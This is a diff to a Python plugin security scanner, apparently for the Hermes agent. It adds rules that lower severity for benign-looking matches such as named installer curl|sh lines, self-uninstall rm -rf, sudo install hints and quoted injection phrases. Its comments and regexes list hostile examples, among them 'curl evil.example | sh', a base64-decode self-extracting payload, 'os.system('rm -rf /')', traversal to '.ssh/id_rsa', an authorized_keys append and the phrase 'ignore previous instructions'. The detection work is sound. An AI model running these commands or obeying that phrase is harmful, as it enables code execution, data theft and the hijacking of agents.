@@ -64,8 +64,13 @@ _CI_WORKFLOW_SUFFIXES = {".yml", ".yaml"}
 
 
 def is_ci_workflow(rel_path: str) -> bool:
-    """A forge CI workflow definition (``.github/workflows/<name>.yml``)."""
+    """A forge CI workflow definition: ``.github/workflows/<name>.yml`` or a GitLab ``.gitlab-ci.yml``.
+    Both run on the forge's runner, never on the host that installs the plugin, and the agent never
+    reads them as instructions, so they take the README prose cap (``os.environ`` reads, ``pip install``
+    steps and ``curl | sh`` of a CI tool are the pipeline's own plumbing)."""
     p = Path(rel_path)
+    if p.name.lower() == ".gitlab-ci.yml":
+        return True
     return (len(p.parts) == 3 and p.parts[0].lower() == ".github" and p.parts[1].lower() == "workflows"
             and p.suffix.lower() in _CI_WORKFLOW_SUFFIXES)
 
@@ -79,6 +84,40 @@ def is_agent_facing(finding: Finding) -> bool:
 def prose_cap(finding: Finding) -> Optional[str]:
     """Stepped-down severity for a command/path-shaped finding in documentation, else None."""
     return None if is_agent_facing(finding) else STEP_DOWN.get(finding.severity)
+
+
+# ── (1c) documented ``curl | sh`` of a known installer ───────────────────────────────────────
+# ``curl_pipe_shell`` keeps full severity in prose because a README — and a CI workflow — is exactly
+# where a malicious download-and-execute one-liner would be planted (``curl evil.example | sh`` in a
+# ``.github/workflows`` step stays ``high``). The documented, non-attack shape is a pipe whose URL is a
+# NAMED trusted installer: Hermes' own ``install.sh``, a named upstream runtime (``ollama.com``,
+# ``bun.sh``, ``get.docker.com``, ``sh.rustup.rs`` …), a named dev-tool CLI (``app.factory.ai``), or a
+# GitHub ``raw`` URL whose path is an ``install`` script. That lands at medium (a note). An unpinned /
+# unknown third-party domain — the attack shape — keeps full severity, in README, code, OR CI.
+_PIPE_TO_SHELL_IDS = {"curl_pipe_shell", "wget_pipe_shell", "curl_pipe_python"}
+_URL_IN_LINE = re.compile(r'https?://([^\s/"\'`)]+)([^\s"\'`)]*)')
+_TRUSTED_INSTALLER_HOSTS = {
+    "hermes-agent.nousresearch.com", "ollama.com", "bun.sh",
+    "get.docker.com", "sh.rustup.rs", "deno.land", "astral.sh", "app.factory.ai",
+}
+
+
+def _is_trusted_installer_url(host: str, path: str) -> bool:
+    host = host.lower()
+    if host in _TRUSTED_INSTALLER_HOSTS:
+        return True
+    # A GitHub raw URL is user-controlled, so only an ``install``-named script path qualifies
+    # (``.../scripts/install.sh``, ``.../install-plugin.sh``), never an arbitrary payload.
+    return host == "raw.githubusercontent.com" and "install" in path.lower()
+
+
+def is_trusted_installer_pipe(finding: Finding, line: str) -> bool:
+    """A ``curl|sh`` finding whose every ``http(s)://`` URL is a named trusted installer — a documented
+    install step, not an attack. An unknown domain anywhere on the line disqualifies the whole line."""
+    if finding.pattern_id not in _PIPE_TO_SHELL_IDS:
+        return False
+    urls = [(m.group(1), m.group(2)) for m in _URL_IN_LINE.finditer(line)]
+    return bool(urls) and all(_is_trusted_installer_url(h, p) for h, p in urls)
 
 
 # ── (1b) language-pack catalogs ─────────────────────────────────────────────────────────────
@@ -102,28 +141,59 @@ def is_locale_catalog(rel_path: str) -> bool:
 
 
 def catalog_cap(finding: Finding) -> Optional[str]:
-    """Stepped-down severity for a finding inside a locale catalog, else None."""
+    """Stepped-down severity for a finding inside a locale catalog, else None. The agent-config family
+    is a translated UI STATUS STRING there (``updating: "… AGENTS.md …"``) — the pack cannot write a
+    file — so it caps to a note (medium), not merely one step; other shapes take the one-step prose cap."""
     if finding.pattern_id in _CATALOG_STEPS_DOWN_IDS:
-        return STEP_DOWN.get(finding.severity)
+        rank = {"low": 0, "medium": 1, "high": 2, "critical": 3}
+        return finding.severity if rank.get(finding.severity, 0) <= rank["medium"] else "medium"
     return prose_cap(finding)
 
 
-# A README "Uninstall" section removing the plugin's OWN install directory
-# (``rm -rf "$HOME/.hermes/plugins/<name>"``, ``rm -rf ~/.hermes/plugins/<name>`` before a reinstall
-# ``cp``) is the one destructive shape that is harmless by construction: one ``rm``, one argument
-# rooted at ``$HOME``/``${HOME}``/``~`` + ``/.hermes/plugins/`` or ``skills/``
-# with a plain leaf — no glob, no ``..``, nothing chained. It lands at medium (a note). Any
-# wider target (``$HOME``, ``$HOME/.hermes``, ``$HOME/.hermes/plugins/*``) only gets the
-# generic prose step (high, caution) and the same line in a ``.sh`` stays critical (#115353).
+# A README "Uninstall" section removing the plugin's OWN install directory under ``~/.hermes`` is the one
+# destructive shape that is harmless by construction: one ``rm``, every operand rooted at
+# ``$HOME``/``${HOME}``/``~`` + ``/.hermes/`` with a plain segment path and a plain leaf — no glob, no
+# ``..``, nothing chained. Documented shapes: ``plugins/<name>`` / ``skills/<name>``, a profile-scoped
+# ``profiles/<profile>/{plugins,roles,...}/<name>``, ``desktop-plugins/<name>``, and the plugin's own
+# data dir ``~/.hermes/<name>`` — and up to a few such operands on one line (``rm -rf ~/.hermes/profiles/N/plugins/crew
+# ~/.hermes/profiles/N/roles/crew``). It lands at medium (a note). A wider target (``$HOME``, ``$HOME/.hermes``,
+# ``$HOME/.hermes/plugins/*``) only gets the generic prose step (high, caution) and the same line in a ``.sh``
+# stays critical (#115353).
+_UNINSTALL_HOME = r'(?:\$HOME|\$\{HOME\}|~)/\.hermes'
+
+
+def _uninstall_operand(group: str) -> str:
+    """One ``~/.hermes/<segments>/<leaf>`` operand, optionally quoted (quote tracked by *group*)."""
+    return (rf'(?P<{group}>["\']?)' + _UNINSTALL_HOME
+            + rf'(?:/[A-Za-z0-9][A-Za-z0-9._-]*)+/?(?P={group})')
+
+
+# ``rm`` plus one or more such operands on the line (``crew`` deletes a plugins dir and a roles dir):
+# distinct capture-group names so the optional-quote backreferences do not collide.
 _SELF_UNINSTALL_RM = re.compile(
     r'^(?:\$\s*)?rm\s+(?:-[a-zA-Z]+\s+)*'
-    r'(?P<q>["\']?)(?:\$HOME|\$\{HOME\}|~)/\.hermes/(?:plugins|skills)/[A-Za-z0-9][A-Za-z0-9._-]*/?(?P=q)'
-    r'\s*(?:#.*)?$'
+    + _uninstall_operand("q0")
+    + r'(?:\s+' + _uninstall_operand("q1") + r')*'
+    + r'\s*(?:#.*)?$'
+)
+
+# The same shape embedded in a backtick code span mid-prose (``… When you're done, `rm -rf
+# ~/.hermes/profiles/lancedb-demo` removes all trace``): the span must contain ONLY the ``rm`` and its
+# ``~/.hermes`` operands and then close (no chaining, no ``&&``, no trailing command), so a chained or
+# force-push example (``rm -rf ~/x && git push --force``) does not qualify.
+_SELF_UNINSTALL_RM_IN_SPAN = re.compile(
+    r'`(?:\$\s*)?rm\s+(?:-[a-zA-Z]+\s+)*'
+    + _uninstall_operand("q2")
+    + r'(?:\s+' + _uninstall_operand("q3") + r')*\s*`'
 )
 
 
 def is_self_uninstall_doc(finding: Finding, line: str) -> bool:
-    return finding.pattern_id == "destructive_home_rm" and _SELF_UNINSTALL_RM.match(line.strip()) is not None
+    if finding.pattern_id != "destructive_home_rm":
+        return False
+    stripped = line.strip()
+    return (_SELF_UNINSTALL_RM.match(stripped) is not None
+            or _SELF_UNINSTALL_RM_IN_SPAN.search(line) is not None)
 
 
 # ── (2) test trees and fixtures ──────────────────────────────────────────────────────────────
@@ -155,6 +225,26 @@ _EXEC_ON_LINE = re.compile(
 # Shell-like files keep the raw line: there ``"$(id)"`` executes inside double quotes.
 _QUOTES_NEVER_EXECUTE_SUFFIXES = {".py", ".pyi", ".js", ".mjs", ".cjs", ".jsx", ".ts", ".mts", ".cts", ".tsx"}
 
+# An exec call whose FIRST argument is a string literal runs that literal: ``os.system('rm -rf /')``,
+# ``open('/etc/passwd')``, ``exec("code")``. A test dispatcher that passes the hostile string as a
+# LATER argument or nested in a dict — ``call(core.detail, "/etc/passwd")``, ``call('read_file',
+# {'path': '/etc/passwd'})`` — hands it as data to a mock and does not run it. ``call``/``run`` are in
+# the exec list for ``subprocess.call``/``.run``, but a bare test helper named ``call()`` collides with
+# it; keying on first-argument position distinguishes the two without dropping a real exec.
+_EXEC_CALL_OPEN = re.compile(
+    r"\b(?:system|popen|run|call|check_output|check_call|Popen|exec|execv\w*|spawn\w*|eval|execSync"
+    r"|execFile\w*|spawnSync|source|os\.startfile|open)\s*\(\s*", re.IGNORECASE)
+
+
+def _exec_first_arg_literal_spans(line: str, spans: list[tuple[int, int]]) -> list[tuple[int, int]]:
+    """Literal spans that sit as the direct first argument of an exec call (``open('<lit>')``)."""
+    out = []
+    for m in _EXEC_CALL_OPEN.finditer(line):
+        span = next(((a, b) for a, b in spans if a == m.end()), None)
+        if span is not None:
+            out.append(span)
+    return out
+
 
 def _executes(line: str, rel_path: str) -> bool:
     if Path(rel_path).suffix.lower() in _QUOTES_NEVER_EXECUTE_SUFFIXES:
@@ -163,15 +253,27 @@ def _executes(line: str, rel_path: str) -> bool:
 
 
 def is_inert_fixture_line(finding: Finding, line: str, is_code: bool, rel_path: str = "") -> bool:
-    """The finding's text is quoted test data on a line that does not execute anything."""
+    """The finding's text is quoted test data that nothing on the line runs: every hit is inside a
+    string literal, and no such literal is the direct first argument of an exec call. A literal passed
+    as a later argument / nested in a dict to a test dispatcher (``call(x, "/etc/passwd")``) is data;
+    ``open('/etc/passwd')`` — the literal as open's first arg — executes and is not inert."""
     if not is_code:
         return True
-    if _executes(line, rel_path):
-        return False
     rx = _PATTERN_BY_ID.get(finding.pattern_id)
     hits = list(rx.finditer(line)) if rx else []
+    if not hits:
+        return False
     spans = [m.span() for m in _LITERAL_SPANS.finditer(line)]
-    return bool(hits) and all(any(a <= h.start() and h.end() <= b for a, b in spans) for h in hits)
+    exec_arg_spans = _exec_first_arg_literal_spans(line, spans)
+    # A non-call exec marker on the line (``$(`` substitution, a shell backtick, a bare ``exec_marker``
+    # with no literal first arg, e.g. ``os.system(payload)`` naming a variable) still executes.
+    non_literal_exec = _executes(line, rel_path) and not _EXEC_CALL_OPEN.search(line)
+
+    def quoted_data(h: re.Match[str]) -> bool:
+        span = next(((a, b) for a, b in spans if a <= h.start() and h.end() <= b), None)
+        return span is not None and span not in exec_arg_spans
+
+    return not non_literal_exec and all(quoted_data(h) for h in hits)
 
 
 def is_test_tree(rel_path: str) -> bool:
@@ -210,6 +312,27 @@ def is_base64_media(line: str) -> bool:
         if _decoded_head(m.group(1)).startswith(_MEDIA_MAGIC):
             return True
     return False
+
+
+# ── (3b) a base64 encode→decode round-trip of a freshly-created archive ─────────────────────────
+# ``base64_decode_pipe`` flags ``base64 -d | tar`` as the embedded-payload attack (``tail "$0" |
+# base64 -d | tar x`` self-extracts a blob the scanner never sees). A base64 TRANSPORT of a
+# freshly-made archive — ``tar czf - … | base64 … | base64 -d | tar xzf - -C "$DEST"`` over SSH — is
+# data movement: the archive is CREATED on the line (``tar c…``) and the base64 is an ENCODE feeding a
+# matching DECODE (round-trip), not an opaque embedded blob. Such a line is a note. The embedded-blob
+# attack (decode only, no ``tar c``/no prior ``base64`` encode) keeps full severity.
+_B64_ROUNDTRIP = re.compile(
+    r'\bbase64\b(?![^\n|;&]*(?:-[a-z]*d[a-z]*|--decode))[^\n]*\|[^\n]*'
+    r'\bbase64\s+(?:-[^\s|]+\s+)*?(?:-[a-z]*d[a-z]*|--decode)\b', re.IGNORECASE)
+_TAR_CREATE = re.compile(r'\btar\s+(?:-?-?create\b|-?-?c[a-z]*f?\b|c[a-z]*f?\b)', re.IGNORECASE)
+
+
+def is_base64_archive_roundtrip(finding: Finding, line: str) -> bool:
+    """A ``base64_decode_pipe`` line that both CREATES an archive (``tar c``) and does a base64
+    encode→decode round-trip — a transport, not an opaque embedded payload."""
+    if finding.pattern_id != "base64_decode_pipe":
+        return False
+    return bool(_B64_ROUNDTRIP.search(line)) and bool(_TAR_CREATE.search(line))
 
 
 # ── (5)/(6) alternation tokens inside string or regex literals in code ──────────────────────
@@ -259,7 +382,7 @@ def is_regex_alternation_token(finding: Finding, line: str) -> bool:
     spans = [m.span() for m in _LITERAL_SPANS.finditer(line)]
     hits = list(token.finditer(line))
 
-    def inert(h: "re.Match[str]") -> bool:
+    def inert(h: re.Match[str]) -> bool:
         if " " in h.group(0):
             return False
         span = next(((a, b) for a, b in spans if a <= h.start() and h.end() <= b), None)
@@ -270,19 +393,206 @@ def is_regex_alternation_token(finding: Finding, line: str) -> bool:
     return bool(hits) and all(inert(h) for h in hits)
 
 
-# ── (6) base64 decode piped to a non-interpreter ────────────────────────────────────────────
-# ``base64_decode_pipe`` describes "decodes and pipes to execution". ``gh api … | base64 -d |
-# grep '^sha:'`` decodes data for a text filter; the shape is only execution when the consumer
-# is a shell/interpreter or ``eval``/``source``/``exec``. A data consumer steps down to medium.
-_DECODE_CONSUMER = re.compile(r"base64\s+(?:-d|--decode)\s*\|\s*(?:\w+=\S*\s+)*(?:\S*/)?(?P<cmd>[A-Za-z0-9_.+-]+)")
-_INTERPRETERS = re.compile(r"^(?:sh|bash|zsh|dash|ksh|fish|python[\d.]*|perl|ruby|node|nodejs|php|eval|source|exec|xargs|env|sudo)$")
+# ── (5b) ``sudo`` in advisory text or a safety disclaimer ─────────────────────────────────────
+# ``sudo_usage`` fires on the bare word. Two shapes are not privilege escalation: (a) an advisory
+# INSTALL/ADMIN HINT the plugin prints/returns — ``return "sudo apt install pass"``, ``"sudo snap
+# install bw"``, ``f"sudo systemctl restart …"`` — ``sudo`` immediately followed by a package manager
+# or admin tool (apt/snap/dnf/systemctl/…) or a ``sudo`` option, inside a string literal on a line
+# that executes nothing; and (b) a SAFETY DISCLAIMER that forbids it — ``Never ask the user for a sudo
+# password``, ``no permissions, xattrs, sudo`` — where a negation governs the word. Both land at medium
+# (a note), CODE files only. A bare command string (``"please run sudo id"``), a ``["sudo", "id"]`` args
+# element, a ``subprocess.run(["sudo", ...])`` call, and a real ``sudo apt-get install`` line in a shell
+# script keep full severity (the first two are handled on data files by ``is_json_prose_value``).
+_SUDO_TOKEN = re.compile(r"\bsudo\b(?!\.\w)")
+_SUDO_ADMIN_HINT = re.compile(
+    r"\bsudo\s+(?:-[A-Za-z]+\b\s+)*(?:apt|apt-get|snap|dnf|yum|pacman|zypper|apk|brew|port|emerge"
+    r"|systemctl|service|launchctl|pip[0-9]*|npm|gem|-u\b|-E\b|-H\b|-n\b)", re.IGNORECASE)
+# ``(?:sudo\s+)?(?:git|…)`` — ``sudo`` inside a REGEX pattern string (the literal ``\s`` whitespace
+# metacharacter marks it as the plugin's OWN command-parser regex, never a real invocation).
+_SUDO_IN_REGEX = re.compile(r"\(\?:?\s*sudo\\s", re.IGNORECASE)
+_SUDO_NEGATION = re.compile(
+    r"\b(?:never|not|no|without|don'?t|cannot|can'?t|avoid|refus\w*|forbid\w*|disallow\w*)\b",
+    re.IGNORECASE)
 
 
-def is_data_decode(line: str) -> bool:
-    """``base64 -d`` whose pipe target is a non-interpreter command (grep, jq, tee, tar …)."""
-    m = _DECODE_CONSUMER.search(line)
-    return m is not None and _INTERPRETERS.match(m.group("cmd")) is None
+def _sudo_in_safety_clause(line: str, start: int) -> bool:
+    """A negation word governs this ``sudo`` — anywhere earlier in the sentence, or in the
+    short clause right after it (``no permissions, xattrs, sudo``)."""
+    before = line[:start]
+    # restrict to the current sentence/clause so a negation two sentences back does not leak in
+    clause = re.split(r"[.;]", before)[-1]
+    return _SUDO_NEGATION.search(clause) is not None
 
+
+def is_sudo_inert(finding: Finding, line: str, rel_path: str) -> bool:
+    """Every ``sudo`` on the line is an advisory install/admin HINT inside a non-executing string
+    literal, or is governed by a safety negation. A bare ``sudo <cmd>`` command string (``"sudo id"``,
+    a ``["sudo", "id"]`` args element) is not an admin hint and is not demoted — on JSON data files
+    those are handled (and kept at severity) by ``is_json_prose_value``."""
+    if finding.pattern_id != "sudo_usage":
+        return False
+    hits = list(_SUDO_TOKEN.finditer(line))
+    if not hits:
+        return False
+    executes = _executes(line, rel_path)
+    spans = [m.span() for m in _LITERAL_SPANS.finditer(line)]
+    admin_hint = {m.start() for m in _SUDO_ADMIN_HINT.finditer(line)}
+    in_regex = _SUDO_IN_REGEX.search(line) is not None
+
+    def inert(h: re.Match[str]) -> bool:
+        in_literal = any(a <= h.start() and h.end() <= b for a, b in spans)
+        if in_literal and not executes and (h.start() in admin_hint or in_regex):
+            return True
+        return _sudo_in_safety_clause(line, h.start())
+
+    return all(inert(h) for h in hits)
+
+
+# ── (5b2) ``env``/``printenv`` in a safety disclaimer ────────────────────────────────────────────
+# ``dump_all_env`` fires on ``env |``/``printenv``. A SKILL.md safety rule forbidding it —
+# ``**Never inspect the environment.** Do not run `env`, `printenv`, `set` …`` (the official
+# nvidia-broadcast skill) — is the opposite of an env dump. When every ``dump_all_env`` hit on the line
+# is governed by a safety negation (``never``/``do not``/``no`` …), the finding is a note. A real
+# ``env | curl …`` keeps full severity (no negation governs it).
+_ENV_DUMP_TOKEN = re.compile(r"printenv|(?<![A-Za-z0-9_])env\s*\|(?!\|)(?!\s*[{(])")
+
+
+def is_env_dump_in_safety_clause(finding: Finding, line: str) -> bool:
+    """Every ``dump_all_env`` hit on the line is governed by a safety negation (a "never/do not" rule)."""
+    if finding.pattern_id != "dump_all_env":
+        return False
+    hits = list(_ENV_DUMP_TOKEN.finditer(line))
+    return bool(hits) and all(_sudo_in_safety_clause(line, h.start()) for h in hits)
+
+
+# ── (5c) a documented injection PHRASE that the plugin's own filter refuses ─────────────────────
+# A context/memory plugin's CHANGELOG or a ``#``/``//`` code comment names the exact phrase its
+# validator rejects (``"ignore previous instructions"``), and a build note shows a role-label example
+# in a backtick span (`` `User: ignore previous instructions` ``). Quoted that way, inside a defensive
+# doc (comment / CHANGELOG), the phrase is a description of a defense, not an instruction — it caps to a
+# note rather than the one-step comment cap. An UNQUOTED injection in a README/SKILL.md prose line, or
+# a quoted phrase outside a comment/CHANGELOG, keeps full severity.
+_INJECTION_PHRASE_IDS = {"prompt_injection_ignore", "disregard_rules"}
+_QUOTED_SPAN = re.compile(r'"[^"\n]*"|\'[^\'\n]*\'|`[^`\n]*`|«[^»\n]*»|“[^”\n]*”|‘[^’\n]*’')
+
+
+def is_quoted_injection_phrase(finding: Finding, line: str) -> bool:
+    """The finding's injection phrase sits entirely inside a quoted/backtick span on the line."""
+    if finding.pattern_id not in _INJECTION_PHRASE_IDS:
+        return False
+    rx = _PATTERN_BY_ID.get(finding.pattern_id)
+    if rx is None:
+        return False
+    spans = [m.span() for m in _QUOTED_SPAN.finditer(line)]
+    hits = list(rx.finditer(line))
+    return bool(hits) and all(any(a <= h.start() and h.end() <= b for a, b in spans) for h in hits)
+
+
+# ── (6) repo-root traversal in a build/setup script ─────────────────────────────────────────────
+# ``path_traversal_deep`` (``../../..``) fires on build-script repo-root resolution:
+# ``resolve(import.meta.dir, '../../..')``, ``cd "$SCRIPT_DIR/../../.."``, ``.../../../..`` — climbing
+# out of a nested package to the repository root. Those ``..`` segments resolve to a known ancestor of
+# the plugin, not into a victim's tree. When every ``../../..`` run on the line is followed only by
+# more ``..``/path separators or a quote/paren (no SENSITIVE leaf — ``etc``, ``passwd``, ``shadow``,
+# ``.ssh``, ``.aws``, ``.env``, ``.hermes``, ``.gnupg``, ``.kube``, ``.docker``, ``.npmrc`` …), the
+# finding is a note. A traversal INTO a sensitive path (``../../../etc/passwd``, ``../../../.ssh/id_rsa``)
+# keeps full severity.
+_TRAVERSAL_RUN = re.compile(r"(?:\.\./)+\.\.")
+_SENSITIVE_AFTER_TRAVERSAL = re.compile(
+    r"(?:/|\\)*(?:etc\b|passwd\b|shadow\b|\.ssh\b|\.aws\b|\.env\b|\.hermes\b|\.gnupg\b|\.kube\b"
+    r"|\.docker\b|\.netrc\b|\.npmrc\b|\.pypirc\b|\.config\b|proc\b|root\b|home\b|var\b|usr\b|sys\b)",
+    re.IGNORECASE)
+
+
+def is_repo_root_traversal(finding: Finding, line: str) -> bool:
+    """Every ``../../..`` run on the line climbs to an ancestor dir, with no sensitive leaf after it."""
+    if finding.pattern_id != "path_traversal_deep":
+        return False
+    runs = list(_TRAVERSAL_RUN.finditer(line))
+    if not runs:
+        return False
+    for m in runs:
+        # skip trailing ``../`` / ``..`` segments, then look at what the path continues into
+        rest = line[m.end():]
+        rest = re.sub(r"^(?:/?\.\.)*/?", "", rest)
+        if _SENSITIVE_AFTER_TRAVERSAL.match(rest):
+            return False
+    return True
+
+
+# ── (6b) a lazy ``__import__("os")`` reading one benign member ───────────────────────────────────
+# ``python_import_os`` flags ``__import__("os")`` as obfuscation. A one-off lazy import that reads a
+# SINGLE benign os member — ``__import__("os").environ.get("X")`` (env override), ``__import__("os").
+# fsync(fd)`` (durable write) — is a readability shortcut, not obfuscated code execution. It caps to a
+# note when the attribute immediately after the import is a known read-only member and the line names
+# no dangerous os call (``system``/``popen``/``exec*``/``spawn*``/``remove``/``unlink``) and no exec marker.
+_IMPORT_OS = re.compile(r'__import__\s*\(\s*["\']os["\']\s*\)\s*\.\s*(\w+)')
+_BENIGN_OS_MEMBERS = {
+    "environ", "getenv", "fsync", "fspath", "path", "sep", "linesep", "name", "getcwd", "getpid",
+    "getppid", "urandom", "cpu_count", "uname", "stat", "listdir", "scandir", "walk", "access",
+    "isatty", "get_terminal_size", "devnull", "curdir", "pardir", "extsep", "altsep", "pathsep",
+}
+_DANGEROUS_OS_ON_LINE = re.compile(
+    r'\bos\s*\.\s*(?:system|popen|exec\w*|spawn\w*|remove|unlink|rmdir|removedirs)\b'
+    r'|__import__\s*\(\s*["\']os["\']\s*\)\s*\.\s*(?:system|popen|exec\w*|spawn\w*|remove|unlink|rmdir)\b')
+
+
+def is_benign_lazy_os_import(finding: Finding, line: str) -> bool:
+    """Every ``__import__("os").<attr>`` on the line reads a benign os member, with no dangerous os
+    call and no exec marker on the line."""
+    if finding.pattern_id != "python_import_os":
+        return False
+    members = [m.group(1) for m in _IMPORT_OS.finditer(line)]
+    if not members or _DANGEROUS_OS_ON_LINE.search(line) or _EXEC_ON_LINE.search(line):
+        return False
+    return all(a in _BENIGN_OS_MEMBERS for a in members)
+
+
+# ── (6c) a disclosed, scoped config-write NOTE in install docs ───────────────────────────────────
+# ``hermes_config_mod`` (the prose-intent tier, ``high``) fires on install docs that transparently state
+# the plugin writes its OWN scoped config section — ``after-install.md``: "Write ``memory.provider:
+# mindgraph`` to ``~/.hermes/config.yaml``", a README "writes **only** the ``memlock:`` section". A
+# README already takes the generic prose cap; ``after-install.md`` is agent-facing and does not, yet a
+# disclosed scoped write is a reviewable behaviour, not an attack. The PROSE tier on a doc/after-install
+# file caps to a note (medium): the finding stays visible, the verdict is not blocked. The MECHANICAL
+# shell-write tier (``hermes_config_mod_shell``, ``>>``/``sed -i``/``tee`` into config.yaml) is never
+# demoted here and keeps full severity.
+_DISCLOSED_CONFIG_PROSE_IDS = {"hermes_config_mod"}
+_AGENT_DOC_NAMES = {"after-install.md"}
+
+
+def is_disclosed_config_note(finding: Finding, rel_path: str) -> bool:
+    """A prose-intent config-mod finding on an install-doc surface (README-like ``.md`` or
+    ``after-install.md``); the mechanical shell-write tier is excluded by pattern id."""
+    if finding.pattern_id not in _DISCLOSED_CONFIG_PROSE_IDS:
+        return False
+    p = Path(rel_path)
+    return p.suffix.lower() == ".md" or p.name.lower() in _AGENT_DOC_NAMES
+
+
+# ── (6d) an ``authorized_keys`` MENTION with no write action ──────────────────────────────────────
+# ``ssh_backdoor`` fires on the token ``authorized_keys``. A plugin whose disclosed purpose is SSH key
+# setup names it in a UI STRING — ``jsx(..., "Add this public key to the remote account's
+# authorized_keys")`` — without appending to it: the token sits inside a string literal and no write
+# action is on the line. That is a reviewable note. An IMPERATIVE doc instruction (``Append this key to
+# authorized_keys.`` in a README, agent-facing prose — not inside a literal) and any real append
+# (``echo "$KEY" >> ~/.ssh/authorized_keys``) keep full severity.
+_AUTHORIZED_KEYS_WRITE = re.compile(
+    r">>?|\btee\b|\bcp\b|\bmv\b|\bsed\s+-\w*i|\bcat\b|writeFileSync|appendFileSync|\.(?:write|append)\w*\s*\(",
+    re.IGNORECASE)
+
+
+def is_authorized_keys_prose(finding: Finding, line: str, is_doc: bool) -> bool:
+    """An ``ssh_backdoor`` (``authorized_keys``) mention where the token sits inside a string literal
+    (a UI label) and no write/append action is on the line. Agent-facing doc PROSE is not covered:
+    ``is_doc`` is accepted for signature symmetry but an imperative README instruction keeps severity."""
+    if finding.pattern_id != "ssh_backdoor" or _AUTHORIZED_KEYS_WRITE.search(line):
+        return False
+    pos = line.lower().find("authorized_keys")
+    if pos < 0:
+        return False
+    return any(a <= pos and pos + len("authorized_keys") <= b for a, b in
+               (m.span() for m in _LITERAL_SPANS.finditer(line)))
 
 # ── (7) loopback address with port ───────────────────────────────────────────────────────────
 # ``hardcoded_ip_port`` is the "network" family's egress tripwire, yet ``127.0.0.1:12306`` in a
@@ -320,7 +630,7 @@ def is_pip_install_in_prose_literal(finding: Finding, line: str) -> bool:
     spans = [m.span() for m in _LITERAL_SPANS.finditer(line)]
     hits = list(_PIP_INSTALL_TOKEN.finditer(line))
 
-    def prose(h: "re.Match[str]") -> bool:
+    def prose(h: re.Match[str]) -> bool:
         span = next(((a, b) for a, b in spans if a <= h.start() and h.end() <= b), None)
         if span is None:
             return False
@@ -416,7 +726,7 @@ def is_json_prose_value(finding: Finding, rel_path: str, line: str) -> bool:
     if key is not None and not re.search(r"\s", key) and _JSON_COMMAND_KEY.search(key):
         return False
 
-    def prose(h: "re.Match[str]") -> bool:
+    def prose(h: re.Match[str]) -> bool:
         part = next((g for g in ("k", "v") if m.start(g) <= h.start() and h.end() <= m.end(g)), None)
         return part is not None and _COMMAND_POSITION.search(line[m.start(part):h.start()]) is None
 
@@ -463,10 +773,34 @@ def is_google_installed_app_secret(finding: Finding, line: str) -> bool:
 
 
 __all__ = [
-    "STEP_DOWN", "DOC_PROSE_EXTENSIONS", "TEST_TREE_DIRS", "LITERAL_INERT_PATTERN_IDS",
-    "is_doc_prose", "is_ci_workflow", "is_agent_facing", "prose_cap", "is_self_uninstall_doc", "is_test_tree",
-    "is_inert_fixture_line", "is_base64_media",
-    "is_regex_alternation_token", "is_data_decode", "is_loopback_only", "is_pip_install_in_prose_literal",
-    "is_hex_in_char_class", "logical_line", "is_loopback_continuation", "is_json_prose_value", "is_coin_name_only",
+    "DOC_PROSE_EXTENSIONS",
+    "LITERAL_INERT_PATTERN_IDS",
+    "STEP_DOWN",
+    "TEST_TREE_DIRS",
+    "is_agent_facing",
+    "is_authorized_keys_prose",
+    "is_base64_archive_roundtrip",
+    "is_base64_media",
+    "is_benign_lazy_os_import",
+    "is_ci_workflow",
+    "is_coin_name_only",
+    "is_disclosed_config_note",
+    "is_doc_prose",
+    "is_env_dump_in_safety_clause",
     "is_google_installed_app_secret",
+    "is_hex_in_char_class",
+    "is_inert_fixture_line",
+    "is_json_prose_value",
+    "is_loopback_continuation",
+    "is_loopback_only",
+    "is_pip_install_in_prose_literal",
+    "is_quoted_injection_phrase",
+    "is_regex_alternation_token",
+    "is_repo_root_traversal",
+    "is_self_uninstall_doc",
+    "is_sudo_inert",
+    "is_test_tree",
+    "is_trusted_installer_pipe",
+    "logical_line",
+    "prose_cap",
 ]
